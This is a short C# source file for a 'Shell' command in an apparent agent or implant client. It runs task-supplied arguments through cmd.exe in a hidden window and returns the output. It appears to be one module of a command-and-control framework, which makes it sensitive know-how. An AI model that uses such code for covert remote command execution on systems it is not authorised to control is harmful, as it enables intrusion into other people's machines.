using AgentClient.Domain.Models.Agents;
using System.Diagnostics;

namespace AgentClient.Application.Commands
{
    public class Shell : AgentCommand
    {
        public override string Name => "shell";

        public override string Execute(AgentTask task)
        {
            var stdout = "";

            var args = string.Join(" ", task.Arguments);

            var pStartInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {args}",
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = Process.Start(pStartInfo);

            using (process.StandardOutput)
            {
                stdout += process.StandardOutput.ReadToEnd();
            }

            using (process.StandardError)
            {
                stdout += process.StandardError.ReadToEnd();
            }

            return stdout;
        }
    }
}
